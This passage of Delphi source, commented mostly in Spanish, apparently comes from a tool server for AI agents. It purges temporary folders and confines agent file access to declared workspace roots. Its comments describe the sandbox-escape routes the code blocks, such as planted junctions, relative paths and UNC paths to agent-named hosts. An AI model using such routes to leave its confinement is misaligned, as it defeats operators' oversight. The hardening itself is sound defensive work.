  // AnsiLowerCase y no LowerCase: la de la RTL solo pliega A-Z, y 'C:\Ñ' y
  // 'C:\ñ' son la misma carpeta (revision de la 1.11.0)
  Result := LowerCase(THashMD5.GetHashString(
    AnsiLowerCase(SinBarraFinal(LongCanonical(ADir)))));
end;

{ La temporal ADir es de ESTE proceso: si ningun otro servidor vivo la ha
  reclamado, la reclama (hasta morir) y True. La clave sale de la ruta
  canonica, asi que la misma carpeta escrita en 8.3 o con otras mayusculas
  es la misma temporal; va resumida porque un nombre de mutex es corto. }
function TemporalEsMia(const ADir: string): Boolean;
var
  Clave: string;
  H: THandle;
begin
  Clave := 'tmp-' + ClaveDeCarpeta(ADir);
  if not Assigned(GTemporalesMias) then
    GTemporalesMias := TStringList.Create;
  if GTemporalesMias.IndexOf(Clave) >= 0 then
    Exit(True);
  Result := ReclamaNombre(Clave, H);
  if Result then
    GTemporalesMias.Add(Clave);
end;

{ True si este proceso es la PRIMERA instancia viva de ESTE exe (esta
  carpeta). El mutex se queda abierto de por vida: ser el primero dura
  hasta morir, y entonces lo hereda el siguiente arranque. Sin esto, un
  arranque stdio del exe del servicio purgaba __delphi-temp con el
  servicio en marcha y una llamada en vuelo perdia su fichero (el -F de
  un commit, una salida de remoterun) - auditoria 2026-09-21. }
function SoyLaPrimeraInstancia: Boolean;
var
  H: THandle;
begin
  if GPrimera <> 0 then
    Exit(True);
  Result := ReclamaNombre(ClaveDeCarpeta(ServerDir), H);
  if Result then
    GPrimera := H;
end;

{ La clave de la presencia de la instancia APid de ESTA casa (la carpeta del
  exe): la escribe ApuntaPresencia y la lee HayOtraInstanciaViva. }
function ClaveDePresencia(APid: DWORD): string;
begin
  Result := ClaveDeCarpeta(ServerDir) + '-pid-' + IntToStr(APid);
end;

{ Esta instancia se apunta como VIVA mientras viva, sea la primera o no: un
  mutex con su PID. La primera no sabia de las demas: el servicio que
  rearranca coge el mutex libre de la primera y vaciaba lo que una instancia
  stdio del mismo exe tenia en vuelo (pendiente 2 de la 1.11.0, medido con
  test_purga_instancias). }
procedure ApuntaPresencia;
begin
  if GPresencia = 0 then
    ReclamaNombre(ClaveDePresencia(GetCurrentProcessId), GPresencia);
end;

{ True si otra instancia de ESTA casa sigue viva. Los procesos se buscan por
  el nombre del exe (Toolhelp, sin abrirlos: desde la sesion interactiva el
  proceso del servicio NO se deja abrir, medido el 3-oct - acceso denegado)
  y cada uno se pregunta por su presencia: si su mutex existe, o no se deja
  abrir, esta vivo. Uno de otra carpeta no tiene presencia con esta clave:
  el mutex se crea y se suelta al momento. En la duda, viva: no purgar es lo
  que no rompe nada. }
function HayOtraInstanciaViva: Boolean;
var
  Snap, H: THandle;
  E: TProcessEntry32;
  Mio: string;
begin
  Result := False;
  Mio := TPath.GetFileName(ParamStr(0));
  Snap := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if Snap = INVALID_HANDLE_VALUE then
    Exit(True);
  try
    E.dwSize := SizeOf(E);
    if Process32First(Snap, E) then
      repeat
        if (E.th32ProcessID <> GetCurrentProcessId) and SameText(string(E.szExeFile), Mio) then
        begin
          if not ReclamaNombre(ClaveDePresencia(E.th32ProcessID), H) then
            Exit(True);
          CloseHandle(H);
        end;
      until not Process32Next(Snap, E);
  finally
    CloseHandle(Snap);
  end;
end;

{ TODAS las __delphi-temp bajo una raiz, la de arriba y las anidadas. Antes
  la purga solo vaciaba <raiz>\__delphi-temp, y una anidada guardo 90
  capturas (66 MB) de Hermes a traves de todos los reinicios del 25-sep.
  Sin cruzar enlaces (un junction dentro de la raiz que apunte fuera no se
  recorre: lo de fuera no es nuestro), sin entrar en .git, sin bajar dentro
  de una temporal ya encontrada, y sin tocar lo PROTEGIDO: lo de solo
  lectura de la raiz (ReadOnlyPaths), todo proyecto de referencia
  (ReadOnlyRoots, de cualquier workspace) y el vault. }
function TemporalesBajo(const ARoot: string;
  const AProtegidas: TArray<string>): TArray<string>;
var
  Acc: TStringList;

  function Protegida(const D: string): Boolean;
  var
    P: string;
  begin
    Result := False;
    for P in AProtegidas do
      if EnLugar(D, P) then // una referencia declarada en 8.3 tambien
        Exit(True);
  end;

  procedure Baja(const D: string; ANivel: Integer);
  var
    Sub, Nombre: string;
    A: Cardinal;
  begin
    if ANivel > 16 then
      Exit; // tope de profundidad: un arbol patologico no para el arranque
    try
      for Sub in TDirectory.GetDirectories(D) do
      begin
        A := GetFileAttributes(PChar(Sub));
        if (A = INVALID_FILE_ATTRIBUTES) or EsEnlace(Sub) then
          Continue; // un enlace: no se sigue
        Nombre := TPath.GetFileName(Sub);
        if SameText(Nombre, '.git') or Protegida(Sub) then
          Continue;
        if SameText(Nombre, TempFolderName) then
        begin
          Acc.Add(Sub);
          Continue;
        end;
        Baja(Sub, ANivel + 1);
      end;
    except
      // una carpeta ilegible: se sigue con las demas
    end;
  end;

begin
  Acc := TStringList.Create;
  try
    if (ARoot.Trim <> '') and TDirectory.Exists(ARoot.Trim) and
       not Protegida(ARoot.Trim) then
      Baja(SinBarraFinal(ARoot.Trim), 0);
    Result := Acc.ToStringArray;
  finally
    Acc.Free;
  end;
end;

{ Las temporales bajo UNA raiz, vaciadas (con ACorte, lo anterior a el:
  VaciaDesechable). Devuelve cuantas ha encontrado que son de este proceso. }
function PurgaRaiz(const ARaiz: string; const ANoSeTocan: TArray<string>;
  ACorte: UInt64): Integer;
var
  T: string;
begin
  Result := 0;
  TemporalEsMia(TPath.Combine(ARaiz, TempFolderName));
  for T in TemporalesBajo(ARaiz, ANoSeTocan) do
    if TemporalEsMia(T) then
    begin
      VaciaDesechable(T, ACorte);
      Inc(Result);
    end;
end;

{ Las raices de la purga, cada SITIO una vez: la misma raiz declarada en dos
  workspaces se purgaba dos veces - en la VM 13.2, N:\CodeSandBox de Claude y
  de Hermes daba dos recorridos por el NAS y dos lineas en el log (6-oct-2026).
  Comparadas en la forma larga (FormaLarga, la de toda comparacion de sitio);
  como la forma larga pregunta al disco, las de RED se pasan aqui DENTRO de su
  hilo, no en el arranque. }
function RaicesSinRepetir(const ARaices: TArray<string>): TArray<string>;
var
  Vistas: TArray<string>;
begin
  Result := nil;
  Vistas := nil;
  for var R in ARaices do
  begin
    var Larga: string;
    try
      Larga := FormaLarga(R);
    except
      Larga := IncludeTrailingPathDelimiter(R); // una raiz no se pierde por no canonizarse
    end;
    if IndexText(Larga, Vistas) >= 0 then
      Continue;
    Vistas := Vistas + [Larga];
    Result := Result + [R];
  end;
end;

procedure PurgeServerTemp;
var
  W: TWorkspaceDef;
  R: string;
begin
  // toda instancia se apunta como viva ANTES de decidir nada
  ApuntaPresencia;
  if not SoyLaPrimeraInstancia then
    Exit;
  // ...y la primera purga solo si es la UNICA viva de esta casa: el servicio
  // que rearranca es la primera aunque una instancia stdio del mismo exe siga
  // con un test, la -F de un commit o una temporal de raiz a medias. Lo que
  // queda se lo lleva el siguiente arranque a solas.
  if HayOtraInstanciaViva then
    Exit;
  // La casa del servidor, la de siempre.
  VaciaDesechable(ServerTempDir);
  // ...y los contenedores de delphi_test que dejo una caida de ESTA casa: sus
  // copias se acaban de ir con la temporal, y el contenedor es la otra mitad.
  // Aqui y no antes del if: un arranque stdio del mismo exe no borra los del
  // servicio en marcha, como no borra sus temporales.
  PurgaContenedoresHuerfanos;
  // ...Y LA DE CADA WORKSPACE. Primer intento: se vaciaba en el primer uso
  // de AgentTempDir, porque "al arrancar no hay workspace activo" - los
  // roots los elige el token de quien llama. Falso: los workspaces ESTAN
  // declarados en el settings.ini y LoadSecurity los tiene desde el
  // arranque; lo que no hay es uno ACTIVO, que no es lo mismo. Lo canto la
  // suite: con el nodo del escritorio ocupado por otra bateria nadie llamaba
  // a AgentTempDir, nadie purgaba, y la migaja de la ejecucion anterior
  // sobrevivia. "Se limpia en el primer uso" no es "se limpia al arrancar",
  // que es lo que se prometio (David, 2026-09-21).
  // Todas las temporales bajo cada raiz de escritura, las anidadas tambien
  // (TemporalesBajo, arriba). Protegido: lo de solo lectura de ESE
  // workspace, cualquier proyecto de referencia y el vault.
  try
    LoadSecurity;
    // lo que no se toca de NINGUN workspace (SitiosQueNoSeTocan)
    var NoSeTocan := SitiosQueNoSeTocan;
    // Solo lo que es de ESTE proceso (TemporalEsMia): la temporal de cada
    // raiz se reclama aunque aun no exista -las llamadas la crearan-, y una
    // que ya es de otro servidor vivo no se toca.
    var Raices: TArray<string> := nil;
    for W in GWorkspaces do
      Raices := Raices + W.Roots;
    Raices := Raices + GRoots; // modo local de lanzamiento (baterias)
    // La raiz en una unidad de RED, aparte (1.9.0). Buscar sus temporales
    // es recorrer el arbol entero por la red - 2,6 ms por carpeta medidos
    // en el servicio de produccion con una raiz que es un recurso de un
    // NAS: el arranque esperaba a eso, y crece con el recurso -, y el
    // cerrojo de TemporalEsMia es de ESTA maquina: el servidor de otra, con
    // una raiz en el mismo recurso, se quedaba sin lo que tuviese a medias.
    // Va en un hilo, despues de las locales (nadie mas toca la lista de
    // TemporalEsMia), y deja lo de la ultima hora (VaciaDesechable).
    var DeRed: TArray<string> := nil;
    var Locales: TArray<string> := nil;
    for R in Raices do
      // (tambien la letra que AUN no esta: si la conecta el reintento
      // mientras tanto, se recorre igual de aparte y con el mismo corte)
      if ClaseDeLetra(LetraDeRuta(R)) <> clLocal then
        DeRed := DeRed + [R]
      else
        Locales := Locales + [R];
    for R in RaicesSinRepetir(Locales) do
      PurgaRaiz(R, NoSeTocan, 0);
    if Length(DeRed) > 0 then
      TThread.CreateAnonymousThread(
        procedure
        var
          Rd: string;
          T0: UInt64;
          N: Integer;
        begin
          // (cada sitio una vez: aqui, que la forma larga pregunta a la red)
          for Rd in RaicesSinRepetir(DeRed) do
            try
              if not TDirectory.Exists(Rd) then
                Continue; // la letra sigue sin estar: nada que limpiar ni que decir
              T0 := GetTickCount64;
              N := PurgaRaiz(Rd, NoSeTocan, CorteDePurga(1));
              NotaAlLog(MsgFmt(SL_NET_PURGA_FMT, [SinBarraFinal(Rd), N,
                Integer(GetTickCount64 - T0)]));
            except
              // limpiar nunca tumba nada
            end;
        end).Start;
  except
    // limpiar no puede impedir arrancar
  end;
end;

function AgentConfineDenied(const AFull, ARoot: string): string;
var
  Me, Rel, Seg, Sh: string;
  P: Integer;
begin
  Result := '';
  if not AgentConfinementNow then
    Exit;
  Me := CurrentAgent;
  if Me = '' then
    Exit; // stdio / operator: not confined
  Rel := AFull.Substring(Length(IncludeTrailingPathDelimiter(ARoot))).Replace('/', '\');
  P := Rel.IndexOf('\');
  if P < 0 then
    Seg := Rel
  else
    Seg := Rel.Substring(0, P);
  if SameText(Seg, Me) then
    Exit; // your own folder
  for Sh in SharedFoldersNow do
    if SameText(Seg, Sh) then
      Exit; // a folder the operator marked shared
  Result := MsgFmt(SR_AGENT_CONFINED_FMT, [Me, Me]);
end;

function LibraryRoots: TArray<string>; forward; // la zona, definida mas abajo

{ La jaula, con AFueraDeJaula = True cuando la negativa es "fuera de las
  raices" (la pista de la zona de biblioteca va solo ahi). Quien pregunta
  es JaulaDenegada, justo debajo. }
function JaulaDecide(const APath: string; out AFueraDeJaula: Boolean): string;
var
  Roots: TArray<string>;
  Full, R: string;
begin
  AFueraDeJaula := False;
  // Una ruta VACIA es un parametro que falta, no una ruta invalida: el eco
  // de "Invalid path: " vacio no decia cual (revision 27-sep-2026)
  if APath.Trim = '' then
    Exit(MsgText(SR_GUARD_RUTA_VACIA));
  // Name normalization first: it applies with or without a jail configured.
  Result := PathAnomaly(APath);
  if Result <> '' then
    Exit;
  // Solo rutas ABSOLUTAS (<letra>:\ o UNC, la regla de EsRutaAbsoluta). Una
  // relativa se resolvia contra la carpeta del PROCESO: fuera de la jaula
  // decia "fuera" (DENIED) y, si el servidor se lanzo desde dentro de una
  // raiz (stdio), se aceptaba y escribia donde nadie habia dicho; un
  // "/home/x" de un cliente Linux, igual (quinta revision). Aqui, a la
  // entrada, para todo camino que pase por la puerta.
  Result := RutaRelativaDenegada(APath);
  if Result <> '' then
    Exit;
  // El modo local cerrado al cargar, con su motivo, ANTES de mirar nada en
  // el disco (iba mas abajo; tercera revision). Un workspace con su token
  // tiene su propia jaula y no lee nada del entorno: no le toca
  Result := NegativaDeCierre;
  if Result <> '' then
    Exit;
  // Un UNC que no es de ningun sitio declarado: fuera, por TEXTO, antes de
  // InVault / ReadOnlyRootOf, que lo resuelven en el disco (SMB hacia el
  // host que diga el agente; septima revision). Tambien para quien llama a
  // la puerta desde dentro, no solo para la entrada.
  if UncFueraDeLugares(APath) then
  begin
    // (la ruta de red de un sitio declarado con su letra NO es "fuera de
    // las raices": no lleva la pista de la zona de biblioteca)
    var EsFormaDeRed: Boolean;
    Result := NegativaDeUnc(APath, EsFormaDeRed);
    AFueraDeJaula := not EsFormaDeRed;
    Exit;
  end;
  // The knowledge vault belongs to the vault_* tools ALONE, wherever it sits.
  // If it happens to live inside a workspace root, the code tools must still
  // keep out - otherwise delphi_edit could rewrite a note behind the vault's
  // back, skipping its automatic backup and its protected governance files.
  if InVault(APath) then
    Exit(MsgText(SR_VAULT_NOT_CODE));
  Roots := WorkspaceRoots;
  if Length(Roots) = 0 then
    Exit; // no jail configured
  try
    Full := TPath.GetFullPath(APath);
  except
    Exit(MsgFmt(SR_GUARD_RUTA_INVALIDA_FMT, [APath]));
  end;
  // Una REFERENCIA (ReadOnlyRoots) se LEE: dentro de ella por la ruta REAL,
  // el mismo repaso de enlaces que las raices (un junction plantado en la
  // referencia que apunte fuera no abre nada). Que no se ESCRIBE lo dice
  // PathDenied, que la mira antes que las raices.
  var Ref := ReadOnlyRootOf(APath);
  if Ref <> '' then
  begin
    if StartsText(IncludeTrailingPathDelimiter(RealPath(Ref)),
         IncludeTrailingPathDelimiter(RealPath(APath))) then
      Exit('');
    Exit(MsgFmt(SR_JAIL_LINK_FMT, [APath]));
  end;
  var FullLargo := FormaLarga(Full);
  for R in Roots do
    if StartsText(R, IncludeTrailingPathDelimiter(Full)) or
       StartsText(FormaLarga(R), FullLargo) then
    begin
      // Dentro POR EL TEXTO (el declarado o el largo, FormaLarga). Falta que
      // lo este DE VERDAD: un junction o un
      // symlink plantado en la jaula apuntaba fuera y el sistema de ficheros
      // servia el destino tan tranquilo (ver RealPath, y la bateria
      // test_round33 que lo reproduce).
      //
      // OJO a como se compara: el mundo REAL consigo mismo, la ruta real
      // contra las raices reales. Mezclar las dos formas - raices resueltas
      // contra rutas textuales - fue el primer intento de esto y rompio algo
      // peor de lo que arreglaba: las carpetas temporales llegan en 8.3
      // (DFONTA~1), RealPath las alarga, la comparacion dejaba de casar y se
      // pudo BORRAR la propia raiz del workspace. Lo cazo test_guard en la
      // misma tanda.
      var Verdad := IncludeTrailingPathDelimiter(RealPath(APath));
      var DentroDeVerdad := False;
      for var RR in Roots do
        if StartsText(IncludeTrailingPathDelimiter(
             RealPath(SinBarraFinal(RR))), Verdad) then
        begin
          DentroDeVerdad := True;
          Break;
        end;
      if not DentroDeVerdad then
        Exit(MsgFmt(SR_JAIL_LINK_FMT, [APath]));
      // ...y el vault por la ruta REAL: un junction de la raiz que apunte
      // dentro de el llevaba a el con un texto que no lo nombra (sexta
      // revision; lo paraba de rebote un fallo de CrearCarpeta).
      if InVault(Verdad) then
        Exit(MsgText(SR_VAULT_NOT_CODE));
      Exit(''); // dentro de una raiz, de verdad: se lee
    end;
  // Fuera de las raices: la zona de biblioteca (RTL/VCL, componentes
  // registrados) se LEE si esta abierta. Solo para quien esta fuera DE
  // VERDAD: un enlace que sale, el vault y las anomalias ya se negaron
  // arriba y nunca llegan aqui.
  if LibraryZoneEnabled then
    for R in LibraryRoots do
      if StartsText(R, IncludeTrailingPathDelimiter(Full)) then
        Exit('');
  AFueraDeJaula := True;
  Result := MsgFmt(SR_JAIL_FMT, [APath, string.Join(' | ', Roots)]);
end;

function JaulaDenegada(const APath: string; out AFueraDeJaula: Boolean): string; overload;
begin
  Result := JaulaDecide(APath, AFueraDeJaula);
  // Un FICHERO que llega con separador final (x.txt\) nombrado como carpeta:
  // se leia como el fichero y fallaba dentro de Windows (INTERNAL, septima
  // revision). Una carpeta con su separador es lo normal. Y DESPUES de la
  // jaula, solo de lo que se puede leer: se miraba antes, y de cualquier
  // ruta de la maquina se contestaba si alli habia un fichero (tercera
  // revision de la 1.9.0)
  if (Result = '') and (APath.EndsWith('\') or APath.EndsWith('/')) and
     TFile.Exists(SinBarraFinal(APath.Replace('/', '\'))) then
    Result := MsgFmt(SR_GUARD_BARRA_FINAL_FMT, [APath]);
end;

function JaulaDenegada(const APath: string): string; overload;
var
  Fuera: Boolean;
begin
  Result := JaulaDenegada(APath, Fuera);
end;

function PathDenied(const APath: string): string;
var
  Roots: TArray<string>;
  Full, R: string;
begin
  // PRIMERO la jaula, sin perdones; lo que sigue solo importa al escribir
  Result := JaulaDenegada(APath);
  if Result <> '' then
    Exit;
  Roots := WorkspaceRoots;
  if Length(Roots) = 0 then
    Exit; // no jail configured: tampoco reglas de escritura
  Full := TPath.GetFullPath(APath); // ya no lanza: la jaula lo comprobo
  // Un proyecto de REFERENCIA (ReadOnlyRoots) manda sobre Roots: una
  // carpeta declarada en los dos sitios, o una raiz que caiga dentro de una
  // referencia, es de SOLO LECTURA (David, 25-sep-2026). Por eso se mira
  // ANTES de las raices; el texto dice que se lee y no se toca.
  var Ref := ReadOnlyRootOf(APath);
  if Ref <> '' then
    Exit(MsgFmt(SR_REFERENCE_ROOT_FMT, [APath, Ref]));
  var FullLargo := FormaLarga(Full);
  for R in Roots do
    if StartsText(R, IncludeTrailingPathDelimiter(Full)) or
       StartsText(FormaLarga(R), FullLargo) then
    begin
      var Verdad := IncludeTrailingPathDelimiter(RealPath(APath));
      // Dentro de la jaula, pero quiza en una carpeta declarada de SOLO
      // LECTURA: un vendor/, un submodulo, un clon de referencia con su
      // propio git. Se comprueba AQUI y no en el lector, y esa es justo la
      // distincion que se quiere: se lee, no se escribe.
      // Por el texto Y por la ruta REAL (Verdad): un junction de la raiz que
      // apunte a una carpeta de solo lectura no la vuelve escribible.
      for var Ro in WorkspaceReadOnlyPaths do
        if EnLugar(Full, Ro) or
           EnLugar(Verdad, RealPath(SinBarraFinal(Ro))) then
          Exit(MsgFmt(SR_READONLY_PATH_FMT, [APath, SinBarraFinal(Ro)]));
      // las dos en la forma larga: el tramo del agente se cuenta desde la raiz
      Exit(AgentConfineDenied(SinBarraFinal(FullLargo), FormaLarga(R)));
    end;
  // la jaula lo dejo pasar sin estar en una raiz: es zona de biblioteca,
  // que se lee y nunca se escribe
  Result := MsgFmt(SR_JAIL_FMT, [APath, string.Join(' | ', Roots)]);
end;

var
  GLibLoaded: Boolean = False;
  GLibRoots: TArray<string>;

{ The read-only library zone: RAD Studio installation + IDE Library Search
  Path directories (installed components), canonicalized. Cached. }
{ Expands $(MACRO) against the IDE's own macro table (plus the few values
  that live outside it), repeatedly, since macros nest. Case-insensitive. }
function ExpandIdeMacros(const AText: string; AVars: TStrings): string;
var
  Pass, I: Integer;
  Name: string;
begin
  Result := AText;
  for Pass := 1 to 4 do
  begin
    if not Result.Contains('$(') then
      Break;
    for I := 0 to AVars.Count - 1 do
    begin
      Name := AVars.Names[I];
      if Name <> '' then
        Result := Result.Replace('$(' + Name + ')', AVars.ValueFromIndex[I],
          [rfReplaceAll, rfIgnoreCase]);
    end;
  end;
end;

procedure IdeMacroVars(const AInfo: TRadStudioInfo; ADest: TStrings);
var
  UserDocs, CommonDocs: string;
begin
  // The IDE's own macro table is authoritative: it carries
  // $(BDSCatalogRepositoryAllUsers), where the GetIt packages live
  // (FmxLinux, Android SDKs, PAServer installers). Without it those
  // paths were silently dropped - measured 2026-08-19.
  IdeEnvironmentVars(AInfo.Version, ADest);
  // Values that are NOT in that key (authoritative from rsvars.bat /
  // the install itself), added without overwriting the IDE's own.
  if ADest.Values['BDS'] = '' then
    ADest.Values['BDS'] := PrefijoSinBarra(AInfo.RootDir);
  if ADest.Values['BDSLIB'] = '' then
    ADest.Values['BDSLIB'] := PrefijoSinBarra(AInfo.RootDir) + '\lib';
  UserDocs := BdsUserDir(AInfo);
  if (UserDocs <> '') and (ADest.Values['BDSUSERDIR'] = '') then
    ADest.Values['BDSUSERDIR'] := UserDocs;
  CommonDocs := BdsCommonDir(AInfo);
  if (CommonDocs <> '') and (ADest.Values['BDSCOMMONDIR'] = '') then
    ADest.Values['BDSCOMMONDIR'] := CommonDocs;
  // Per-user catalog repository: sibling of the common one, under the
  // user's own documents root (the IDE exposes only the AllUsers one).
  if (ADest.Values['BDSCatalogRepository'] = '') and (UserDocs <> '') then
    ADest.Values['BDSCatalogRepository'] :=
      IncludeTrailingPathDelimiter(UserDocs) + 'CatalogRepository';
end;

function IdePlatformLibraryPaths(const AInfo: TRadStudioInfo; const APlatform: string;
  const AValor: string): TArray<string>;
var
  Vars, List: TStringList;
  Item, Expanded: string;
begin
  Result := nil;
  if not AInfo.Found then
    Exit;
  Vars := TStringList.Create;
  List := TStringList.Create;
  try
    IdeMacroVars(AInfo, Vars);
    Vars.Values['Platform'] := APlatform;
    for Item in IdeConfigValue(AInfo.Version, 'Library\' + APlatform, AValor).Split([';']) do
    begin
      Expanded := ExpandIdeMacros(Item.Trim, Vars);
      if (Expanded = '') or Expanded.Contains('$(') or
         not TPath.IsPathRooted(Expanded) then
        Continue;
      try
        Expanded := PrefijoSinBarra(TPath.GetFullPath(Expanded));
      except
        Continue;
      end;
      if List.IndexOf(Expanded) < 0 then
        List.Add(Expanded);
    end;
    Result := List.ToStringArray;
  finally
    List.Free;
    Vars.Free;
  end;
end;

function LibraryRoots: TArray<string>;
var
  Info: TRadStudioInfo;
  List, Vars: TStringList;
  Plat, Raw, Item, Expanded: string;
begin
  if not GLibLoaded then
  begin
    List := TStringList.Create;
    try
      // THE Delphi of this server, and no other (David, 5-oct-2026: "nos
      // centramos en el Delphi que usemos en el server"). Until then EVERY
      // installation was readable; another version's sources are no use
      // to a server that builds with this one.
      Info := DiscoverRadStudio;
      if Info.Found then
      begin
        List.Add(IncludeTrailingPathDelimiter(TPath.GetFullPath(Info.RootDir)));
        Vars := TStringList.Create;
        try
          IdeMacroVars(Info, Vars);

          // The catalog repositories THEMSELVES, whole: every GetIt package
          // lives there (FmxLinux, LockBox...), and the Library Search Path
          // only points at its compiled Lib\ folder - what an agent actually
          // wants to read is the sibling source\. Also covers the Android
          // SDKs and the PAServer installers.
          for Item in TArray<string>.Create(Vars.Values['BDSCatalogRepositoryAllUsers'],
            Vars.Values['BDSCatalogRepository']) do
            if (Item <> '') and TPath.IsPathRooted(Item) then
            try
              Expanded := IncludeTrailingPathDelimiter(TPath.GetFullPath(Item));
              if List.IndexOf(Expanded) < 0 then
                List.Add(Expanded);
            except
              // never breaks the server
            end;

          // ALL platforms registered for this install, never a fixed pair:
          // Linux64, OSX64, Android64, iOSDevice64... each has its own path.
          for Plat in IdeLibraryPlatforms(Info.Version) do
          begin
            Vars.Values['Platform'] := Plat;
            Raw := IdeLibrarySearchPath(Info.Version, Plat);
            for Item in Raw.Split([';']) do
            begin
              Expanded := ExpandIdeMacros(Item.Trim, Vars);
              if (Expanded <> '') and not Expanded.Contains('$(') and
                 TPath.IsPathRooted(Expanded) then
              try
                Expanded := IncludeTrailingPathDelimiter(TPath.GetFullPath(Expanded));
                if List.IndexOf(Expanded) < 0 then
                  List.Add(Expanded);
                // A component's INSTALL ROOT is library territory too: the IDE
                // registers its Source\ (or a per-platform Lib\), and next to
                // it live Library\, Redist\, Examples\ - the native runtime
                // libraries a deployment must ship (field 2026-08-22: OBR's
                // libzbar.so in Library\Linux64, unreadable because only
                // Source\ was registered). One level up, never a drive root,
                // never above the IDE's own documents trees.
                Expanded := PrefijoSinBarra(Expanded);
                Expanded := TPath.GetDirectoryName(Expanded);
                if (Expanded <> '') and (Length(Expanded) > 3) and
                   (TPath.GetDirectoryName(Expanded) <> '') then
                begin
                  Expanded := IncludeTrailingPathDelimiter(Expanded);
                  if List.IndexOf(Expanded) < 0 then
                    List.Add(Expanded);
                end;
              except
                // an unparseable entry never breaks the server
              end;
            end;
          end;
        finally
          Vars.Free;
        end;
      end;
      GLibRoots := List.ToStringArray;
    finally
      List.Free;
    end;
    GLibLoaded := True;
  end;
  Result := GLibRoots;
end;

function ParametroQueNoVa(const AModo: string; const ATabla, AEnviados: array of string;
  out ASuyos: string): string;
var
  I: Integer;
  Hay: Boolean;
  Suyos: string;
begin
  Result := '';
  ASuyos := '';
  Hay := False;
  I := 0;
  while I + 1 <= High(ATabla) do
  begin
    if SameText(ATabla[I], AModo) then
    begin
      Hay := True;
      ASuyos := ATabla[I + 1];
      Break;
    end;
    Inc(I, 2);
  end;
  if not Hay then
    Exit;
  Suyos := ' ' + LowerCase(ASuyos) + ' ';
  I := 0;
  while I + 2 <= High(AEnviados) do
  begin
    if (AEnviados[I + 1].Trim <> '') and
       not SameText(AEnviados[I + 1].Trim, AEnviados[I + 2]) and
       not Suyos.Contains(' ' + LowerCase(AEnviados[I]) + ' ') then
      Exit(AEnviados[I]);
    Inc(I, 3);
  end;
end;

function PrimerAncestroQueExiste(const ARuta: string): string;
begin
  Result := ARuta;
  // un ENLACE existe aunque su destino no (una junction a una unidad
  // desmontada): TDirectory.Exists dice False, y el deshacer la tomaba
  // por creada y la quitaba (decima revision)
  while (Result <> '') and not TDirectory.Exists(Result) and not EsEnlace(Result) and
        (ExtractFileDir(Result) <> Result) do
    Result := ExtractFileDir(Result);
end;

procedure QuitaCarpetasCreadas(const ADesde, AAncestro: string);
var
  D: string;
begin
  D := SinBarraFinal(ADesde);
  try
    while (AAncestro <> '') and (Length(D) > Length(SinBarraFinal(AAncestro))) and
          (EscrituraDenegada(D) = '') do
    begin
      // un enlace no lo creo nadie aqui: nunca se quita (decima revision)
      if EsEnlace(D) or not RemoveDir(D) then
        Break; // no esta vacia (otro dejo algo) o no se puede: se queda
      D := ExtractFileDir(D);
    end;
  except
    // quitar lo creado nunca lanza
  end;
end;

function EsPrefijoDeDispositivo(const APath: string): Boolean;
var
  P: string;
begin
  P := APath.Trim.Replace('/', '\');
  Result := StartsText('\\?\', P) or StartsText('\\.\', P);
end;

function RutaSinTocarElDisco(const APath: string): Boolean;
begin
  Result := UncFueraDeLugares(APath) or EsPrefijoDeDispositivo(APath);
end;

{ Un UNC de verdad (\\host\...), no un prefijo de dispositivo (\\?\, \\.\).
  Con barras de Windows. LA pregunta de quien mira un UNC por su texto:
  estaba escrita en cuatro sitios (tercer revisor de la 1.8.2). }
function EsUnc(const APath: string): Boolean;
begin
  Result := APath.StartsWith('\\') and not EsPrefijoDeDispositivo(APath);
end;

{ Los lugares que el operador declaro (raices, referencias, solo lectura, el
  vault, la zona de biblioteca): UNA lista para quien pregunta por un UNC
  (UncFueraDeLugares) y para el host que vuelve de srvhost (HostUncDeclarado).
  Desde la 1.9.0 las raices, las referencias, lo de solo lectura y el vault
  son SIEMPRE de letra (el cargador no carga otra cosa): lo unico de esta
  lista que puede ser un UNC es una carpeta de la zona de biblioteca - un
  Library Path del IDE en un recurso. Lo que en las dos funciones de abajo
  trata un sitio declarado en UNC queda solo para eso, y SIN check propio:
  lo media una raiz UNC (A13 y A14 de test_alias83), que ya no existe. }
function LugaresDeclarados: TArray<string>;
begin
  Result := WorkspaceRoots + WorkspaceReadOnlyRoots + WorkspaceReadOnlyPaths;
  if VaultPath <> '' then
    Result := Result + [VaultPath];
  if LibraryZoneEnabled then
    Result := Result + LibraryRoots;
end;

{ El host UNC de los lugares declarados, si es UNO solo ('' si ninguno o
  varios): lo que \\srvhost\ significa al volver del agente. }
function HostUncDeclarado: string;
var
  L, H: string;
  I: Integer;
begin
  Result := '';
  if Length(WorkspaceRoots) = 0 then
    Exit;
  for L in LugaresDeclarados do
  begin
    H := L.Trim.Replace('/', '\');
    if not EsUnc(H) then
      Continue;
    H := H.Substring(2);
    I := H.IndexOf('\');
    if I > 0 then
      H := H.Substring(0, I);
    if H = '' then
      Continue;
    if Result = '' then
      Result := H
    else if not SameText(Result, H) then
      Exit(''); // dos hosts: no se adivina
  end;
end;

function UncFueraDeLugares(const APath: string): Boolean;
var
  P, L: string;
  Lugares: TArray<string>;
begin
  P := APath.Trim.Replace('/', '\');
  // los prefijos de dispositivo son de PathAnomaly (GUARD-022), no de aqui
  if not EsUnc(P) then
    Exit(False);
  // sin jaula no hay "fuera"; el modo local CERRADO no tiene sitios, y todo
  // UNC lo esta: se llegaba al host que nombrase el agente antes de negarlo
  // (1,3 s medidos con uno que no existe; tercera revision de la 1.9.0)
  if Length(WorkspaceRoots) = 0 then
    Exit(NegativaDeCierre <> '');
  Lugares := LugaresDeclarados;
  P := IncludeTrailingPathDelimiter(P);
  for L in Lugares do
  begin
    if (L.Trim <> '') and
       StartsText(IncludeTrailingPathDelimiter(L.Trim.Replace('/', '\')), P) then
      Exit(False);
    // ...y por la forma LARGA de un sitio declarado en 8.3: la entrada ya
    // alargo la ruta del agente y un sitio UNC declarado con ~ lo negaba
    // TODO (octava revision). La E/S es sobre el sitio del operador, no
    // sobre lo que manda el agente.
    if (L.IndexOf('~') >= 0) and StartsText(FormaLarga(L.Trim.Replace('/', '\')), P) then
      Exit(False);
    // ...y una ruta del agente con segmentos en 8.3 (C$\Users\DAVID~1\...\largo):
    // se alarga ELLA, pero solo si su recurso (\\servidor\recurso) es el de
    // un sitio declarado - la E/S va a un host que declaro el operador, nunca
    // a uno que nombre el agente (octava revision; lo media el A13 de
    // test_alias83 con una raiz UNC, hasta la 1.8.2)
    if (P.IndexOf('~') >= 0) and
       SameText(ExtractFileDrive(P), ExtractFileDrive(L.Trim.Replace('/', '\'))) and
       StartsText(FormaLarga(L.Trim.Replace('/', '\')), FormaLarga(P)) then
      Exit(False);
  end;
